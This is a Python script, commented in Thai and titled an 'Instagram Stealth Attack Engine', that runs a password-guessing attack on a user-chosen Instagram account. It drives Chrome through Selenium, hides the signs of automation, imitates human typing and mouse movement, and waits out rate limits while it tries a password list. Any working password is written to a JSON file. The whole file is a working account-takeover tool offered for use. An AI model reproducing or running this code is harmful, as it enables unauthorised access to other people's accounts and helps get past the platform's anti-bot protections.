#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🕷️ Working Stealth Hacker - โค้ดจริงที่ใช้งานได้
Instagram Stealth Attack Engine
"""

import time
import random
import json
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.action_chains import ActionChains
import os

class WorkingStealthHacker:
    def __init__(self):
        self.driver = None
        self.target_username = ""
        self.password_list = []
        self.success_count = 0
        self.attempt_count = 0
        
    def setup_chrome_driver(self):
        """ตั้งค่า Chrome driver แบบ stealth"""
        print("🕷️ กำลังตั้งค่า Stealth Chrome...")
        
        options = Options()
        
        # Stealth options
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-extensions')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        
        # Hide automation
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        try:
            self.driver = webdriver.Chrome(options=options)
            
            # Execute script to hide automation
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            print("✅ Chrome driver พร้อมใช้งาน")
            return True
            
        except Exception as e:
            print(f"❌ ไม่สามารถตั้งค่า Chrome driver: {str(e)}")
            print("💡 ติดตั้ง chromedriver ด้วย: apt install chromium-chromedriver")
            return False
    
    def human_typing(self, element, text, delay_range=(0.05, 0.15)):
        """พิมพ์แบบมนุษย์ (ช้าๆ)"""
        element.clear()
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(*delay_range))
    
    def random_mouse_movement(self):
        """เลื่อนเมาส์แบบสุ่ม"""
        try:
            actions = ActionChains(self.driver)
            # สุ่มตำแหน่ง
            x = random.randint(100, 800)
            y = random.randint(100, 600)
            actions.move_by_offset(x, y).perform()
            time.sleep(random.uniform(0.5, 1.5))
        except:
            pass
    
    def load_passwords(self, password_file="whatilove1728.txt"):
        """โหลดรายการรหัสผ่าน"""
        try:
            if os.path.exists(password_file):
                with open(password_file, 'r', encoding='utf-8') as f:
                    self.password_list = [line.strip() for line in f if line.strip()]
                print(f"📋 โหลดรหัสผ่าน {len(self.password_list)} รายการจาก {password_file}")
            else:
                # รหัสผ่านตัวอย่าง
                self.password_list = [
                    "123456", "password", "123456789", "12345678", "12345",
                    "1234567", "1234567890", "qwerty", "abc123", "111111",
                    "password123", "admin", "letmein", "welcome", "monkey"
                ]
                print(f"📋 ใช้รหัสผ่านตัวอย่าง {len(self.password_list)} รายการ")
        except Exception as e:
            print(f"❌ ไม่สามารถโหลดรหัสผ่าน: {str(e)}")
    
    def goto_instagram_login(self):
        """ไปที่หน้าล็อกอิน Instagram"""
        try:
            print("🌐 เข้าสู่ Instagram...")
            self.driver.get("https://www.instagram.com/accounts/login/")
            
            # รอให้หน้าโหลด
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            
            # รอเพิ่มเติม
            time.sleep(random.uniform(3, 6))
            print("✅ หน้าล็อกอินโหลดแล้ว")
            return True
            
        except Exception as e:
            print(f"❌ ไม่สามารถเข้า Instagram: {str(e)}")
            return False
    
    def try_login(self, username, password):
        """ลองล็อกอินด้วย username และ password"""
        try:
            print(f"🔐 ลองล็อกอิน: {username} / {password}")
            
            # หา username field
            username_field = self.driver.find_element(By.NAME, "username")
            self.human_typing(username_field, username)
            
            # รอสักครู่
            time.sleep(random.uniform(1, 2))
            
            # หา password field
            password_field = self.driver.find_element(By.NAME, "password")
            self.human_typing(password_field, password)
            
            # รอก่อนกดปุ่ม
            time.sleep(random.uniform(1, 3))
            
            # เลื่อนเมาส์สุ่ม
            self.random_mouse_movement()
            
            # กดปุ่มล็อกอิน
            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
            login_button.click()
            
            # รอผลลัพธ์
            time.sleep(random.uniform(4, 8))
            
            # ตรวจสอบว่าล็อกอินสำเร็จหรือไม่
            current_url = self.driver.current_url
            
            if "/accounts/login/" not in current_url:
                print(f"🎉 ล็อกอินสำเร็จ! {username}:{password}")
                return True
            else:
                print(f"❌ ล็อกอินไม่สำเร็จ")
                return False
                
        except Exception as e:
            print(f"❌ เกิดข้อผิดพลาดในการล็อกอิน: {str(e)}")
            return False
    
    def start_attack(self):
        """เริ่มการโจมตี"""
        print("\n🚀 เริ่ม Stealth Attack!")
        print("="*50)
        
        # ขอ username เป้าหมาย
        self.target_username = input("👤 ใส่ username เป้าหมาย: ").strip()
        
        if not self.target_username:
            print("❌ ต้องใส่ username")
            return
        
        # โหลดรหัสผ่าน
        self.load_passwords()
        
        if not self.password_list:
            print("❌ ไม่มีรหัสผ่านให้ทดสอบ")
            return
        
        # ตั้งค่า Chrome
        if not self.setup_chrome_driver():
            return
        
        try:
            # ไปหน้าล็อกอิน
            if not self.goto_instagram_login():
                return
            
            # ลองรหัสผ่านทีละตัว
            for i, password in enumerate(self.password_list, 1):
                print(f"\n📊 ความคืบหน้า: {i}/{len(self.password_list)}")
                
                self.attempt_count += 1
                
                # ลองล็อกอิน
                success = self.try_login(self.target_username, password)
                
                if success:
                    self.success_count += 1
                    
                    # บันทึกผลลัพธ์
                    result = {
                        "username": self.target_username,
                        "password": password,
                        "status": "SUCCESS",
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                    }
                    
                    with open("stealth_success.json", "w") as f:
                        json.dump(result, f, indent=2)
                    
                    print(f"💾 บันทึกผลลัพธ์ในไฟล์ stealth_success.json")
                    print(f"🎯 ล็อกอินสำเร็จ! ใช้งานได้: {self.target_username}:{password}")
                    
                    # หยุดเมื่อสำเร็จ
                    break
                
                # รอก่อนลองครั้งต่อไป (ป้องกัน rate limiting)
                delay = random.uniform(8, 15)
                print(f"⏳ รอ {delay:.1f} วินาทีก่อนลองต่อ...")
                time.sleep(delay)
                
                # รีเฟรชหน้าเพื่อล้าง error
                self.driver.refresh()
                time.sleep(random.uniform(3, 6))
        
        except KeyboardInterrupt:
            print("\n\n⚠️ หยุดการทำงานโดยผู้ใช้")
        
        except Exception as e:
            print(f"\n❌ เกิดข้อผิดพลาด: {str(e)}")
        
        finally:
            # ปิด browser
            if self.driver:
                self.driver.quit()
                print("🔒 ปิด browser แล้ว")
            
            # แสดงสรุปผล
            print(f"\n📊 สรุปผลการโจมตี:")
            print(f"🎯 เป้าหมาย: {self.target_username}")
            print(f"🔢 จำนวนครั้งที่ลอง: {self.attempt_count}")
            print(f"✅ สำเร็จ: {self.success_count}")

def main():
    """ฟังก์ชันหลัก"""
    print("🍭 SugarGlitch - Working Stealth Hacker")
    print("="*50)
    
    hacker = WorkingStealthHacker()
    hacker.start_attack()

if __name__ == "__main__":
    main()
